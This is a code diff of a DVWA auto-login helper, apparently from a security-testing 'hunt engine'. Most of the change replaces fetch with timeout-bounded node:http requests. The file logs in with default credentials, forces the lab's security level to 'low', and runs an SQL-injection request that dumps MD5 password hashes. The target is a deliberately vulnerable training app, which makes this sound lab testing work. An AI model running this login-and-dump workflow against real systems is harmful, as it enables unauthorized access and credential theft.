@@ -1,11 +1,28 @@
 /**
  * dvwaAuth.js — DVWA auto-login helper for the hunt engine.
  *
- * Uses Node.js fetch directly (backend can reach 172.17.0.1:3100).
- * No container exec needed.
+ * Transport is node:http/https with agent:false (see labRequest) —
+ * NOT the global fetch. The global fetch (undici) pools sockets and,
+ * when a request aborts while its proxy CONNECT is still pending,
+ * the socket is never destroyed: it stays open forever and keeps
+ * the process alive. That stalled the backend test suite (a file
+ * whose tests all passed still never exited, so node --test never
+ * freed its slot and queued files never started). A fresh socket
+ * per request, destroyed on end/abort, leaves nothing behind.
  */
 
+import http from 'node:http';
+import https from 'node:https';
+
 const cookieJars = new Map(); // huntId -> cookie string
+
+// REQUEST TIMEOUT (6 Nov 2026): every lab request carries a hard
+// wall-clock timeout, so one dead/unreachable lab fails fast instead
+// of hanging the caller forever. humanIteration awaits dvwaLogin on
+// EVERY turn for DVWA targets; the lab answers on the LAN in
+// milliseconds, so 5s is generous. A timeout aborts into the
+// existing fetch_failed path and the turn carries on.
+export const DVWA_FETCH_TIMEOUT_MS = 5000;
 
 function extractCookies(setCookieHeaders) {
   if (!setCookieHeaders) return '';
@@ -26,7 +43,92 @@ function mergeCookies(oldJar, newCookies) {
   return [...map.entries()].map(([k, v]) => `${k}=${v}`).join('; ');
 }
 
-export async function dvwaLogin({ huntId, target, username = 'admin', password = 'password' }) {
+/**
+ * One lab request. Fresh socket (agent:false), destroyed on end,
+ * error, or wall-clock timeout — nothing is pooled, nothing lingers.
+ * Returns { status, headers, text } or throws on network/timeout.
+ */
+function labRequestOnce(url, { method = 'GET', headers = {}, body = null, timeoutMs = DVWA_FETCH_TIMEOUT_MS } = {}) {
+  const u = new URL(url);
+  const isHttps = u.protocol === 'https:';
+  const lib = isHttps ? https : http;
+  const payload = body == null ? null : String(body);
+  const reqHeaders = { ...headers };
+  if (payload != null && reqHeaders['Content-Length'] == null && reqHeaders['content-length'] == null) {
+    reqHeaders['Content-Length'] = Buffer.byteLength(payload);
+  }
+  return new Promise((resolve, reject) => {
+    let settled = false;
+    let timer;
+    const done = (fn, value) => {
+      if (settled) return;
+      settled = true;
+      if (timer) clearTimeout(timer);
+      fn(value);
+    };
+    const req = lib.request(
+      {
+        protocol: u.protocol,
+        hostname: u.hostname,
+        port: u.port || (isHttps ? 443 : 80),
+        path: `${u.pathname}${u.search}`,
+        method,
+        headers: reqHeaders,
+        agent: false,
+      },
+      (res) => {
+        const chunks = [];
+        res.on('data', (chunk) => chunks.push(chunk));
+        res.on('end', () => {
+          done(resolve, { status: res.statusCode || 0, headers: res.headers, text: Buffer.concat(chunks).toString('utf8') });
+        });
+        res.on('error', (err) => done(reject, err));
+      },
+    );
+    // Hard wall-clock bound: covers DNS, connect, and response stalls.
+    timer = setTimeout(() => req.destroy(new Error('lab request timed out')), timeoutMs);
+    req.on('error', (err) => done(reject, err));
+    if (payload != null) req.write(payload);
+    req.end();
+  });
+}
+
+/**
+ * labRequest with redirect following (fetch 'follow' semantics:
+ * 301/302/303 turn a POST into a GET; 307/308 keep method+body).
+ * Cookies set by one hop are sent on the next, and the returned
+ * headers carry the combined set-cookie list of the whole chain.
+ */
+async function labRequest(url, { method = 'GET', headers = {}, body = null, timeoutMs = DVWA_FETCH_TIMEOUT_MS, maxRedirects = 5 } = {}) {
+  let currentUrl = url;
+  let currentMethod = method;
+  let currentBody = body;
+  let hopJar = '';
+  const allCookies = [];
+  for (let hops = 0; hops <= maxRedirects; hops++) {
+    const hopHeaders = { ...headers };
+    if (hopJar) hopHeaders.Cookie = mergeCookies(hopHeaders.Cookie || '', hopJar);
+    const res = await labRequestOnce(currentUrl, { method: currentMethod, headers: hopHeaders, body: currentBody, timeoutMs });
+    if (res.headers['set-cookie']) {
+      const list = Array.isArray(res.headers['set-cookie']) ? res.headers['set-cookie'] : [res.headers['set-cookie']];
+      allCookies.push(...list);
+      hopJar = mergeCookies(hopJar, extractCookies(res.headers['set-cookie']));
+    }
+    const location = res.headers.location;
+    if (res.status >= 300 && res.status < 400 && location && hops < maxRedirects) {
+      currentUrl = new URL(location, currentUrl).toString();
+      if (res.status === 303 || ((res.status === 301 || res.status === 302) && currentMethod === 'POST')) {
+        currentMethod = 'GET';
+        currentBody = null;
+      }
+      continue;
+    }
+    return { status: res.status, headers: { ...res.headers, 'set-cookie': allCookies }, text: res.text };
+  }
+  throw new Error('too many redirects');
+}
+
+export async function dvwaLogin({ huntId, target, username = 'admin', password = 'password', timeoutMs = DVWA_FETCH_TIMEOUT_MS }) {
   const base = String(target || '').replace(/\/+$/, '');
   if (!base) return { ok: false, error: 'no_target' };
 
@@ -34,11 +136,12 @@ export async function dvwaLogin({ huntId, target, username = 'admin', password =
     let jar = cookieJars.get(huntId) || '';
 
     // 1. GET login.php, extract CSRF token
-    const loginRes = await fetch(`${base}/login.php`, {
+    const loginRes = await labRequest(`${base}/login.php`, {
       headers: jar ? { Cookie: jar } : {},
+      timeoutMs,
     });
-    jar = mergeCookies(jar, extractCookies(loginRes.headers.getSetCookie?.() || loginRes.headers.get('set-cookie')));
-    const loginHtml = await loginRes.text();
+    jar = mergeCookies(jar, extractCookies(loginRes.headers['set-cookie']));
+    const loginHtml = loginRes.text;
     const tokenMatch = loginHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                        loginHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
     const token = tokenMatch ? tokenMatch[1] : null;
@@ -46,34 +149,35 @@ export async function dvwaLogin({ huntId, target, username = 'admin', password =
 
     // 2. POST login
     const body = new URLSearchParams({ username, password, user_token: token, Login: 'Login' });
-    const postRes = await fetch(`${base}/login.php`, {
+    const postRes = await labRequest(`${base}/login.php`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
         ...(jar ? { Cookie: jar } : {}),
       },
       body: body.toString(),
-      redirect: 'follow',
+      timeoutMs,
     });
-    jar = mergeCookies(jar, extractCookies(postRes.headers.getSetCookie?.() || postRes.headers.get('set-cookie')));
-    const loggedHtml = await postRes.text();
+    jar = mergeCookies(jar, extractCookies(postRes.headers['set-cookie']));
+    const loggedHtml = postRes.text;
     if (!/welcome/i.test(loggedHtml)) return { ok: false, error: 'login_failed' };
 
     // 3. Set security=low (GET token first)
-    const secRes = await fetch(`${base}/security.php`, { headers: { Cookie: jar } });
-    jar = mergeCookies(jar, extractCookies(secRes.headers.getSetCookie?.() || secRes.headers.get('set-cookie')));
-    const secHtml = await secRes.text();
+    const secRes = await labRequest(`${base}/security.php`, { headers: { Cookie: jar }, timeoutMs });
+    jar = mergeCookies(jar, extractCookies(secRes.headers['set-cookie']));
+    const secHtml = secRes.text;
     const secMatch = secHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                      secHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
     const secToken = secMatch ? secMatch[1] : token;
     const secBody = new URLSearchParams({ security: 'low', user_token: secToken, seclev_submit: 'Submit' });
-    await fetch(`${base}/security.php`, {
+    await labRequest(`${base}/security.php`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
         Cookie: jar,
       },
       body: secBody.toString(),
+      timeoutMs,
     });
 
     cookieJars.set(huntId, jar);
@@ -125,12 +229,12 @@ export function getDvwaCookies(huntId) {
  * hashes = unique lowercase MD5 strings; rows = [{user, hash}] parsed from the
  * DVWA "First name: X / Surname: <md5>" rendering.
  */
-export async function dvwaSqliDump({ huntId, target }) {
+export async function dvwaSqliDump({ huntId, target, timeoutMs = DVWA_FETCH_TIMEOUT_MS }) {
   const base = String(target || '').replace(/\/+$/, '');
   if (!base) return { ok: false, error: 'no_target' };
 
   // Fresh login (handles per-request CSRF token + sets security=low).
-  const login = await dvwaLogin({ huntId, target: base });
+  const login = await dvwaLogin({ huntId, target: base, timeoutMs });
   if (!login.ok) return { ok: false, error: 'login_failed', detail: login.error };
 
   try {
@@ -140,10 +244,11 @@ export async function dvwaSqliDump({ huntId, target }) {
     // DVWA does not require it for the id parameter).
     let token = '';
     try {
-      const pageRes = await fetch(`${base}/vulnerabilities/sqli/`, {
+      const pageRes = await labRequest(`${base}/vulnerabilities/sqli/`, {
         headers: { Cookie: jar },
+        timeoutMs,
       });
-      const pageHtml = await pageRes.text();
+      const pageHtml = pageRes.text;
       const tm = pageHtml.match(/user_token['"]\s+value=['"]([^'"]+)['"]/i) ||
                  pageHtml.match(/name=['"]user_token['"][^>]*value=['"]([^'"]+)['"]/i);
       if (tm) token = tm[1];
@@ -156,16 +261,16 @@ export async function dvwaSqliDump({ huntId, target }) {
     const body = new URLSearchParams({ id: injection, Submit: 'Submit' });
     if (token) body.set('user_token', token);
 
-    const dumpRes = await fetch(`${base}/vulnerabilities/sqli/`, {
+    const dumpRes = await labRequest(`${base}/vulnerabilities/sqli/`, {
       method: 'POST',
       headers: {
         'Content-Type': 'application/x-www-form-urlencoded',
         Cookie: jar,
       },
       body: body.toString(),
-      redirect: 'follow',
+      timeoutMs,
     });
-    const dumpHtml = await dumpRes.text();
+    const dumpHtml = dumpRes.text;
 
     // Extract MD5 hashes (the password column). Dedupe, lowercase.
     const hashMatches = dumpHtml.match(/\b[a-f0-9]{32}\b/gi) || [];
